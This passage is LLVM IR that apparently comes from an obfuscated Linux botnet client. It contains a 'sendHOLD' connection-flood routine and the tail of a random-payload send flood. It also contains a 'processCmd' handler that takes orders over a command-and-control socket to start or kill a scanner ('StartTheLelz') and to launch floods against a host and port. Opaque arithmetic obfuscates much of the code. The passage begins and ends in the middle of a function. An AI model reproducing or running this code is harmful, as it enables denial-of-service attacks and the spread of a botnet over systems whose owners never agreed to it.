  %171 = call i32 @select(i32 %169, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.__sigset_t* null, %struct.timeval* %12)
  store i32 %171, i32* %15, align 4
  %172 = load i32, i32* %15, align 4
  %173 = icmp eq i32 %172, 1
  br i1 %173, label %174, label %201

; <label>:174:                                    ; preds = %138
  store i32 4, i32* %13, align 4
  %175 = load i32, i32* %8, align 4
  %176 = sext i32 %175 to i64
  %177 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %176
  %178 = getelementptr inbounds %struct.state_t, %struct.state_t* %177, i32 0, i32 0
  %179 = load i32, i32* %178, align 8
  %180 = bitcast i32* %14 to i8*
  %181 = call i32 @getsockopt(i32 %179, i32 1, i32 4, i8* %180, i32* %13) #2
  %182 = load i32, i32* %14, align 4
  %183 = icmp ne i32 %182, 0
  br i1 %183, label %184, label %195

; <label>:184:                                    ; preds = %174
  %185 = load i32, i32* %8, align 4
  %186 = sext i32 %185 to i64
  %187 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %186
  %188 = getelementptr inbounds %struct.state_t, %struct.state_t* %187, i32 0, i32 0
  %189 = load i32, i32* %188, align 8
  %190 = call i32 @close(i32 %189)
  %191 = load i32, i32* %8, align 4
  %192 = sext i32 %191 to i64
  %193 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %192
  %194 = getelementptr inbounds %struct.state_t, %struct.state_t* %193, i32 0, i32 1
  store i8 0, i8* %194, align 4
  br label %200

; <label>:195:                                    ; preds = %174
  %196 = load i32, i32* %8, align 4
  %197 = sext i32 %196 to i64
  %198 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %197
  %199 = getelementptr inbounds %struct.state_t, %struct.state_t* %198, i32 0, i32 1
  store i8 2, i8* %199, align 4
  br label %200

; <label>:200:                                    ; preds = %195, %184
  br label %216

; <label>:201:                                    ; preds = %138
  %202 = load i32, i32* %15, align 4
  %203 = icmp eq i32 %202, -1
  br i1 %203, label %204, label %215

; <label>:204:                                    ; preds = %201
  %205 = load i32, i32* %8, align 4
  %206 = sext i32 %205 to i64
  %207 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %206
  %208 = getelementptr inbounds %struct.state_t, %struct.state_t* %207, i32 0, i32 0
  %209 = load i32, i32* %208, align 8
  %210 = call i32 @close(i32 %209)
  %211 = load i32, i32* %8, align 4
  %212 = sext i32 %211 to i64
  %213 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %212
  %214 = getelementptr inbounds %struct.state_t, %struct.state_t* %213, i32 0, i32 1
  store i8 0, i8* %214, align 4
  br label %215

; <label>:215:                                    ; preds = %204, %201
  br label %216

; <label>:216:                                    ; preds = %215, %200
  br label %243

; <label>:217:                                    ; preds = %61
  %218 = load i8*, i8** %16, align 8
  call void @makeRandomStr(i8* %218, i32 1024)
  %219 = load i32, i32* %8, align 4
  %220 = sext i32 %219 to i64
  %221 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %220
  %222 = getelementptr inbounds %struct.state_t, %struct.state_t* %221, i32 0, i32 0
  %223 = load i32, i32* %222, align 8
  %224 = load i8*, i8** %16, align 8
  %225 = call i64 @send(i32 %223, i8* %224, i64 1024, i32 16384)
  %226 = icmp eq i64 %225, -1
  br i1 %226, label %227, label %242

; <label>:227:                                    ; preds = %217
  %228 = call i32* @__errno_location() #13
  %229 = load i32, i32* %228, align 4
  %230 = icmp ne i32 %229, 11
  br i1 %230, label %231, label %242

; <label>:231:                                    ; preds = %227
  %232 = load i32, i32* %8, align 4
  %233 = sext i32 %232 to i64
  %234 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %233
  %235 = getelementptr inbounds %struct.state_t, %struct.state_t* %234, i32 0, i32 0
  %236 = load i32, i32* %235, align 8
  %237 = call i32 @close(i32 %236)
  %238 = load i32, i32* %8, align 4
  %239 = sext i32 %238 to i64
  %240 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %239
  %241 = getelementptr inbounds %struct.state_t, %struct.state_t* %240, i32 0, i32 1
  store i8 0, i8* %241, align 4
  br label %242

; <label>:242:                                    ; preds = %231, %227, %217
  br label %243

; <label>:243:                                    ; preds = %242, %216, %126, %61
  br label %244

; <label>:244:                                    ; preds = %243
  %245 = load i32, i32* %8, align 4
  %246 = sub i32 %245, -1222273913
  %247 = add i32 %246, 1
  %248 = add i32 %247, -1222273913
  %249 = add nsw i32 %245, 1
  store i32 %248, i32* %8, align 4
  br label %57

; <label>:250:                                    ; preds = %57
  br label %52

; <label>:251:                                    ; preds = %52
  %252 = load i8*, i8** %10, align 8
  call void @llvm.stackrestore(i8* %252)
  br label %253

; <label>:253:                                    ; preds = %251, %31
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @sendHOLD(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca i8*, align 8
  %11 = alloca %struct.__sigset_t, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %22 = call i32 @getdtablesize() #2
  %23 = sdiv i32 %22, 2
  store i32 %23, i32* %7, align 4
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 2, i16* %24, align 4
  %25 = load i32, i32* %5, align 4
  %26 = trunc i32 %25 to i16
  %27 = call zeroext i16 @htons(i16 zeroext %26) #13
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %27, i16* %28, align 2
  %29 = load i8*, i8** %4, align 8
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %31 = call i32 @getHost(i8* %29, %struct.in_addr* %30)
  %32 = icmp ne i32 %31, 0
  br i1 %32, label %33, label %34

; <label>:33:                                     ; preds = %3
  br label %289

; <label>:34:                                     ; preds = %3
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 3
  %36 = getelementptr inbounds [8 x i8], [8 x i8]* %35, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %36, i8 0, i64 8, i32 4, i1 false)
  %37 = load i32, i32* %7, align 4
  %38 = zext i32 %37 to i64
  %39 = call i8* @llvm.stacksave()
  store i8* %39, i8** %10, align 8
  %40 = alloca %struct.state_t, i64 %38, align 16
  %41 = bitcast %struct.state_t* %40 to i8*
  %42 = load i32, i32* %7, align 4
  %43 = sext i32 %42 to i64
  %44 = mul i64 %43, 5
  call void @llvm.memset.p0i8.i64(i8* %41, i8 0, i64 %44, i32 16, i1 false)
  %45 = call noalias i8* @malloc(i64 1024) #2
  store i8* %45, i8** %16, align 8
  %46 = load i8*, i8** %16, align 8
  call void @llvm.memset.p0i8.i64(i8* %46, i8 0, i64 1024, i32 1, i1 false)
  %47 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %48 = load i32, i32* %6, align 4
  %49 = sub i32 0, %47
  %50 = sub i32 0, %48
  %51 = add i32 %49, %50
  %52 = sub i32 0, %51
  %53 = add nsw i32 %47, %48
  store i32 %52, i32* %17, align 4
  br label %54

; <label>:54:                                     ; preds = %286, %34
  %55 = load i32, i32* %17, align 4
  %56 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %57 = icmp sgt i32 %55, %56
  br i1 %57, label %58, label %287

; <label>:58:                                     ; preds = %54
  store i32 0, i32* %8, align 4
  br label %59

; <label>:59:                                     ; preds = %281, %58
  %60 = load i32, i32* %8, align 4
  %61 = load i32, i32* %7, align 4
  %62 = icmp slt i32 %60, %61
  br i1 %62, label %63, label %286

; <label>:63:                                     ; preds = %59
  %64 = load i32, i32* %8, align 4
  %65 = sext i32 %64 to i64
  %66 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %65
  %67 = getelementptr inbounds %struct.state_t, %struct.state_t* %66, i32 0, i32 1
  %68 = load i8, i8* %67, align 4
  %69 = zext i8 %68 to i32
  switch i32 %69, label %280 [
    i32 0, label %70
    i32 1, label %129
    i32 2, label %219
  ]

; <label>:70:                                     ; preds = %63
  %71 = call i32 @socket(i32 2, i32 1, i32 0) #2
  %72 = load i32, i32* %8, align 4
  %73 = sext i32 %72 to i64
  %74 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %73
  %75 = getelementptr inbounds %struct.state_t, %struct.state_t* %74, i32 0, i32 0
  store i32 %71, i32* %75, align 8
  %76 = load i32, i32* %8, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %77
  %79 = getelementptr inbounds %struct.state_t, %struct.state_t* %78, i32 0, i32 0
  %80 = load i32, i32* %79, align 8
  %81 = load i32, i32* %8, align 4
  %82 = sext i32 %81 to i64
  %83 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %82
  %84 = getelementptr inbounds %struct.state_t, %struct.state_t* %83, i32 0, i32 0
  %85 = load i32, i32* %84, align 8
  %86 = call i32 (i32, i32, ...) @fcntl(i32 %85, i32 3, i8* null)
  %87 = xor i32 %86, -1
  %88 = xor i32 2048, -1
  %89 = xor i32 -28284328, -1
  %90 = and i32 %87, -28284328
  %91 = and i32 %86, %89
  %92 = and i32 %88, -28284328
  %93 = and i32 2048, %89
  %94 = or i32 %90, %91
  %95 = or i32 %92, %93
  %96 = xor i32 %94, %95
  %97 = or i32 %87, %88
  %98 = xor i32 %97, -1
  %99 = or i32 -28284328, %89
  %100 = and i32 %98, %99
  %101 = or i32 %96, %100
  %102 = or i32 %86, 2048
  %103 = call i32 (i32, i32, ...) @fcntl(i32 %80, i32 4, i32 %101)
  %104 = load i32, i32* %8, align 4
  %105 = sext i32 %104 to i64
  %106 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %105
  %107 = getelementptr inbounds %struct.state_t, %struct.state_t* %106, i32 0, i32 0
  %108 = load i32, i32* %107, align 8
  %109 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %110 = call i32 @connect(i32 %108, %struct.sockaddr* %109, i32 16)
  %111 = icmp ne i32 %110, -1
  br i1 %111, label %116, label %112

; <label>:112:                                    ; preds = %70
  %113 = call i32* @__errno_location() #13
  %114 = load i32, i32* %113, align 4
  %115 = icmp ne i32 %114, 115
  br i1 %115, label %116, label %123

; <label>:116:                                    ; preds = %112, %70
  %117 = load i32, i32* %8, align 4
  %118 = sext i32 %117 to i64
  %119 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %118
  %120 = getelementptr inbounds %struct.state_t, %struct.state_t* %119, i32 0, i32 0
  %121 = load i32, i32* %120, align 8
  %122 = call i32 @close(i32 %121)
  br label %128

; <label>:123:                                    ; preds = %112
  %124 = load i32, i32* %8, align 4
  %125 = sext i32 %124 to i64
  %126 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %125
  %127 = getelementptr inbounds %struct.state_t, %struct.state_t* %126, i32 0, i32 1
  store i8 1, i8* %127, align 4
  br label %128

; <label>:128:                                    ; preds = %123, %116
  br label %280

; <label>:129:                                    ; preds = %63
  br label %130

; <label>:130:                                    ; preds = %129
  %131 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %132 = getelementptr inbounds [16 x i64], [16 x i64]* %131, i64 0, i64 0
  %133 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %132) #2, !srcloc !7
  %134 = extractvalue { i64, i64* } %133, 0
  %135 = extractvalue { i64, i64* } %133, 1
  %136 = trunc i64 %134 to i32
  store i32 %136, i32* %18, align 4
  %137 = ptrtoint i64* %135 to i64
  %138 = trunc i64 %137 to i32
  store i32 %138, i32* %19, align 4
  br label %139

; <label>:139:                                    ; preds = %130
  br label %140

; <label>:140:                                    ; preds = %139
  %141 = load i32, i32* %8, align 4
  %142 = sext i32 %141 to i64
  %143 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %142
  %144 = getelementptr inbounds %struct.state_t, %struct.state_t* %143, i32 0, i32 0
  %145 = load i32, i32* %144, align 8
  %146 = srem i32 %145, 64
  %147 = zext i32 %146 to i64
  %148 = shl i64 1, %147
  %149 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %150 = load i32, i32* %8, align 4
  %151 = sext i32 %150 to i64
  %152 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %151
  %153 = getelementptr inbounds %struct.state_t, %struct.state_t* %152, i32 0, i32 0
  %154 = load i32, i32* %153, align 8
  %155 = sdiv i32 %154, 64
  %156 = sext i32 %155 to i64
  %157 = getelementptr inbounds [16 x i64], [16 x i64]* %149, i64 0, i64 %156
  %158 = load i64, i64* %157, align 8
  %159 = and i64 %158, %148
  %160 = xor i64 %158, %148
  %161 = or i64 %159, %160
  %162 = or i64 %158, %148
  store i64 %161, i64* %157, align 8
  %163 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 0, i64* %163, align 8
  %164 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 10000, i64* %164, align 8
  %165 = load i32, i32* %8, align 4
  %166 = sext i32 %165 to i64
  %167 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %166
  %168 = getelementptr inbounds %struct.state_t, %struct.state_t* %167, i32 0, i32 0
  %169 = load i32, i32* %168, align 8
  %170 = sub i32 0, 1
  %171 = sub i32 %169, %170
  %172 = add nsw i32 %169, 1
  %173 = call i32 @select(i32 %171, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.__sigset_t* null, %struct.timeval* %12)
  store i32 %173, i32* %15, align 4
  %174 = load i32, i32* %15, align 4
  %175 = icmp eq i32 %174, 1
  br i1 %175, label %176, label %203

; <label>:176:                                    ; preds = %140
  store i32 4, i32* %13, align 4
  %177 = load i32, i32* %8, align 4
  %178 = sext i32 %177 to i64
  %179 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %178
  %180 = getelementptr inbounds %struct.state_t, %struct.state_t* %179, i32 0, i32 0
  %181 = load i32, i32* %180, align 8
  %182 = bitcast i32* %14 to i8*
  %183 = call i32 @getsockopt(i32 %181, i32 1, i32 4, i8* %182, i32* %13) #2
  %184 = load i32, i32* %14, align 4
  %185 = icmp ne i32 %184, 0
  br i1 %185, label %186, label %197

; <label>:186:                                    ; preds = %176
  %187 = load i32, i32* %8, align 4
  %188 = sext i32 %187 to i64
  %189 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %188
  %190 = getelementptr inbounds %struct.state_t, %struct.state_t* %189, i32 0, i32 0
  %191 = load i32, i32* %190, align 8
  %192 = call i32 @close(i32 %191)
  %193 = load i32, i32* %8, align 4
  %194 = sext i32 %193 to i64
  %195 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %194
  %196 = getelementptr inbounds %struct.state_t, %struct.state_t* %195, i32 0, i32 1
  store i8 0, i8* %196, align 4
  br label %202

; <label>:197:                                    ; preds = %176
  %198 = load i32, i32* %8, align 4
  %199 = sext i32 %198 to i64
  %200 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %199
  %201 = getelementptr inbounds %struct.state_t, %struct.state_t* %200, i32 0, i32 1
  store i8 2, i8* %201, align 4
  br label %202

; <label>:202:                                    ; preds = %197, %186
  br label %218

; <label>:203:                                    ; preds = %140
  %204 = load i32, i32* %15, align 4
  %205 = icmp eq i32 %204, -1
  br i1 %205, label %206, label %217

; <label>:206:                                    ; preds = %203
  %207 = load i32, i32* %8, align 4
  %208 = sext i32 %207 to i64
  %209 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %208
  %210 = getelementptr inbounds %struct.state_t, %struct.state_t* %209, i32 0, i32 0
  %211 = load i32, i32* %210, align 8
  %212 = call i32 @close(i32 %211)
  %213 = load i32, i32* %8, align 4
  %214 = sext i32 %213 to i64
  %215 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %214
  %216 = getelementptr inbounds %struct.state_t, %struct.state_t* %215, i32 0, i32 1
  store i8 0, i8* %216, align 4
  br label %217

; <label>:217:                                    ; preds = %206, %203
  br label %218

; <label>:218:                                    ; preds = %217, %202
  br label %280

; <label>:219:                                    ; preds = %63
  br label %220

; <label>:220:                                    ; preds = %219
  %221 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %222 = getelementptr inbounds [16 x i64], [16 x i64]* %221, i64 0, i64 0
  %223 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %222) #2, !srcloc !8
  %224 = extractvalue { i64, i64* } %223, 0
  %225 = extractvalue { i64, i64* } %223, 1
  %226 = trunc i64 %224 to i32
  store i32 %226, i32* %20, align 4
  %227 = ptrtoint i64* %225 to i64
  %228 = trunc i64 %227 to i32
  store i32 %228, i32* %21, align 4
  br label %229

; <label>:229:                                    ; preds = %220
  br label %230

; <label>:230:                                    ; preds = %229
  %231 = load i32, i32* %8, align 4
  %232 = sext i32 %231 to i64
  %233 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %232
  %234 = getelementptr inbounds %struct.state_t, %struct.state_t* %233, i32 0, i32 0
  %235 = load i32, i32* %234, align 8
  %236 = srem i32 %235, 64
  %237 = zext i32 %236 to i64
  %238 = shl i64 1, %237
  %239 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %240 = load i32, i32* %8, align 4
  %241 = sext i32 %240 to i64
  %242 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %241
  %243 = getelementptr inbounds %struct.state_t, %struct.state_t* %242, i32 0, i32 0
  %244 = load i32, i32* %243, align 8
  %245 = sdiv i32 %244, 64
  %246 = sext i32 %245 to i64
  %247 = getelementptr inbounds [16 x i64], [16 x i64]* %239, i64 0, i64 %246
  %248 = load i64, i64* %247, align 8
  %249 = and i64 %248, %238
  %250 = xor i64 %248, %238
  %251 = or i64 %249, %250
  %252 = or i64 %248, %238
  store i64 %251, i64* %247, align 8
  %253 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 0, i64* %253, align 8
  %254 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 10000, i64* %254, align 8
  %255 = load i32, i32* %8, align 4
  %256 = sext i32 %255 to i64
  %257 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %256
  %258 = getelementptr inbounds %struct.state_t, %struct.state_t* %257, i32 0, i32 0
  %259 = load i32, i32* %258, align 8
  %260 = sub i32 0, %259
  %261 = sub i32 0, 1
  %262 = add i32 %260, %261
  %263 = sub i32 0, %262
  %264 = add nsw i32 %259, 1
  %265 = call i32 @select(i32 %263, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.timeval* %12)
  store i32 %265, i32* %15, align 4
  %266 = load i32, i32* %15, align 4
  %267 = icmp ne i32 %266, 0
  br i1 %267, label %268, label %279

; <label>:268:                                    ; preds = %230
  %269 = load i32, i32* %8, align 4
  %270 = sext i32 %269 to i64
  %271 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %270
  %272 = getelementptr inbounds %struct.state_t, %struct.state_t* %271, i32 0, i32 0
  %273 = load i32, i32* %272, align 8
  %274 = call i32 @close(i32 %273)
  %275 = load i32, i32* %8, align 4
  %276 = sext i32 %275 to i64
  %277 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %276
  %278 = getelementptr inbounds %struct.state_t, %struct.state_t* %277, i32 0, i32 1
  store i8 0, i8* %278, align 4
  br label %279

; <label>:279:                                    ; preds = %268, %230
  br label %280

; <label>:280:                                    ; preds = %279, %218, %128, %63
  br label %281

; <label>:281:                                    ; preds = %280
  %282 = load i32, i32* %8, align 4
  %283 = sub i32 0, 1
  %284 = sub i32 %282, %283
  %285 = add nsw i32 %282, 1
  store i32 %284, i32* %8, align 4
  br label %59

; <label>:286:                                    ; preds = %59
  br label %54

; <label>:287:                                    ; preds = %54
  %288 = load i8*, i8** %10, align 8
  call void @llvm.stackrestore(i8* %288)
  br label %289

; <label>:289:                                    ; preds = %287, %33
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @processCmd(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i8*, align 8
  %15 = alloca i8*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i8*, align 8
  %22 = alloca i8*, align 8
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca i8*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca i32, align 4
  %28 = alloca i8*, align 8
  %29 = alloca i32, align 4
  %30 = alloca i32, align 4
  %31 = alloca i8*, align 8
  %32 = alloca i32, align 4
  %33 = alloca i32, align 4
  %34 = alloca i8*, align 8
  %35 = alloca i8*, align 8
  %36 = alloca i32, align 4
  %37 = alloca i32, align 4
  %38 = alloca i8*, align 8
  %39 = alloca i8*, align 8
  %40 = alloca i32, align 4
  %41 = alloca i32, align 4
  %42 = alloca i32, align 4
  %43 = alloca i8*, align 8
  %44 = alloca i32, align 4
  %45 = alloca i32, align 4
  %46 = alloca i8*, align 8
  %47 = alloca i32, align 4
  %48 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %49 = load i8**, i8*** %4, align 8
  %50 = getelementptr inbounds i8*, i8** %49, i64 0
  %51 = load i8*, i8** %50, align 8
  %52 = call i32 @strcmp(i8* %51, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.45, i32 0, i32 0)) #10
  %53 = icmp ne i32 %52, 0
  br i1 %53, label %57, label %54

; <label>:54:                                     ; preds = %2
  %55 = load i32, i32* @mainCommSock, align 4
  %56 = call i32 (i32, i8*, ...) @sockprintf(i32 %55, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.67, i32 0, i32 0))
  br label %828

; <label>:57:                                     ; preds = %2
  %58 = load i8**, i8*** %4, align 8
  %59 = getelementptr inbounds i8*, i8** %58, i64 0
  %60 = load i8*, i8** %59, align 8
  %61 = call i32 @strcmp(i8* %60, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.68, i32 0, i32 0)) #10
  %62 = icmp ne i32 %61, 0
  br i1 %62, label %68, label %63

; <label>:63:                                     ; preds = %57
  %64 = load i32, i32* @mainCommSock, align 4
  %65 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %66 = call i8* @inet_ntoa(i32 %65) #2
  %67 = call i32 (i32, i8*, ...) @sockprintf(i32 %64, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.69, i32 0, i32 0), i8* %66)
  br label %828

; <label>:68:                                     ; preds = %57
  %69 = load i8**, i8*** %4, align 8
  %70 = getelementptr inbounds i8*, i8** %69, i64 0
  %71 = load i8*, i8** %70, align 8
  %72 = call i32 @strcmp(i8* %71, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.70, i32 0, i32 0)) #10
  %73 = icmp ne i32 %72, 0
  br i1 %73, label %120, label %74

; <label>:74:                                     ; preds = %68
  %75 = load i32, i32* %3, align 4
  %76 = icmp ne i32 %75, 2
  br i1 %76, label %77, label %80

; <label>:77:                                     ; preds = %74
  %78 = load i32, i32* @mainCommSock, align 4
  %79 = call i32 (i32, i8*, ...) @sockprintf(i32 %78, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.71, i32 0, i32 0))
  br label %828

; <label>:80:                                     ; preds = %74
  %81 = load i8**, i8*** %4, align 8
  %82 = getelementptr inbounds i8*, i8** %81, i64 1
  %83 = load i8*, i8** %82, align 8
  %84 = call i32 @strcmp(i8* %83, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.72, i32 0, i32 0)) #10
  %85 = icmp ne i32 %84, 0
  br i1 %85, label %95, label %86

; <label>:86:                                     ; preds = %80
  %87 = load i32, i32* @scanPid, align 4
  %88 = icmp eq i32 %87, 0
  br i1 %88, label %89, label %90

; <label>:89:                                     ; preds = %86
  br label %828

; <label>:90:                                     ; preds = %86
  %91 = load i32, i32* @scanPid, align 4
  %92 = call i32 @kill(i32 %91, i32 9) #2
  %93 = load i32, i32* @mainCommSock, align 4
  %94 = call i32 (i32, i8*, ...) @sockprintf(i32 %93, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.73, i32 0, i32 0))
  store i32 0, i32* @scanPid, align 4
  br label %95

; <label>:95:                                     ; preds = %90, %80
  %96 = load i8**, i8*** %4, align 8
  %97 = getelementptr inbounds i8*, i8** %96, i64 1
  %98 = load i8*, i8** %97, align 8
  %99 = call i32 @strcmp(i8* %98, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.74, i32 0, i32 0)) #10
  %100 = icmp ne i32 %99, 0
  br i1 %100, label %119, label %101

; <label>:101:                                    ; preds = %95
  %102 = load i32, i32* @scanPid, align 4
  %103 = icmp ne i32 %102, 0
  br i1 %103, label %104, label %105

; <label>:104:                                    ; preds = %101
  br label %828

; <label>:105:                                    ; preds = %101
  %106 = call i32 @fork() #2
  store i32 %106, i32* %6, align 4
  %107 = load i32, i32* %6, align 4
  %108 = icmp ugt i32 %107, 0
  br i1 %108, label %109, label %111

; <label>:109:                                    ; preds = %105
  %110 = load i32, i32* %6, align 4
  store i32 %110, i32* @scanPid, align 4
  br label %828

; <label>:111:                                    ; preds = %105
  %112 = load i32, i32* %6, align 4
  %113 = icmp eq i32 %112, -1
  br i1 %113, label %114, label %115

; <label>:114:                                    ; preds = %111
  br label %828

; <label>:115:                                    ; preds = %111
  br label %116

; <label>:116:                                    ; preds = %115
  %117 = load i32, i32* @mainCommSock, align 4
  %118 = call i32 (i32, i8*, ...) @sockprintf(i32 %117, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.75, i32 0, i32 0))
  call void @StartTheLelz()
  call void @_exit(i32 0) #12
  unreachable

; <label>:119:                                    ; preds = %95
  br label %120

; <label>:120:                                    ; preds = %119, %68
  %121 = load i8**, i8*** %4, align 8
  %122 = getelementptr inbounds i8*, i8** %121, i64 0
  %123 = load i8*, i8** %122, align 8
  %124 = call i32 @strcmp(i8* %123, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.76, i32 0, i32 0)) #10
  %125 = icmp ne i32 %124, 0
  br i1 %125, label %182, label %126

; <label>:126:                                    ; preds = %120
  %127 = load i32, i32* %3, align 4
  %128 = icmp slt i32 %127, 4
  br i1 %128, label %141, label %129

; <label>:129:                                    ; preds = %126
  %130 = load i8**, i8*** %4, align 8
  %131 = getelementptr inbounds i8*, i8** %130, i64 2
  %132 = load i8*, i8** %131, align 8
  %133 = call i32 @atoi(i8* %132) #10
  %134 = icmp slt i32 %133, 1
  br i1 %134, label %141, label %135

; <label>:135:                                    ; preds = %129
  %136 = load i8**, i8*** %4, align 8
  %137 = getelementptr inbounds i8*, i8** %136, i64 3
  %138 = load i8*, i8** %137, align 8
  %139 = call i32 @atoi(i8* %138) #10
  %140 = icmp slt i32 %139, 1
  br i1 %140, label %141, label %142

; <label>:141:                                    ; preds = %135, %129, %126
  br label %828

; <label>:142:                                    ; preds = %135
  %143 = load i8**, i8*** %4, align 8
  %144 = getelementptr inbounds i8*, i8** %143, i64 1
  %145 = load i8*, i8** %144, align 8
  store i8* %145, i8** %7, align 8
  %146 = load i8**, i8*** %4, align 8
  %147 = getelementptr inbounds i8*, i8** %146, i64 2
  %148 = load i8*, i8** %147, align 8
  %149 = call i32 @atoi(i8* %148) #10
  store i32 %149, i32* %8, align 4
  %150 = load i8**, i8*** %4, align 8
  %151 = getelementptr inbounds i8*, i8** %150, i64 3
  %152 = load i8*, i8** %151, align 8
  %153 = call i32 @atoi(i8* %152) #10
  store i32 %153, i32* %9, align 4
  %154 = load i8*, i8** %7, align 8
  %155 = call i8* @strstr(i8* %154, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i32 0, i32 0)) #10
  %156 = icmp ne i8* %155, null
  br i1 %156, label %157, label %173

; <label>:157:                                    ; preds = %142
  %158 = load i8*, i8** %7, align 8
  %159 = call i8* @strtok(i8* %158, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i32 0, i32 0)) #2
  store i8* %159, i8** %10, align 8
  br label %160

; <label>:160:                                    ; preds = %170, %157
  %161 = load i8*, i8** %10, align 8
  %162 = icmp ne i8* %161, null
  br i1 %162, label %163, label %172

; <label>:163:                                    ; preds = %160
  %164 = call i32 @listFork()
  %165 = icmp ne i32 %164, 0
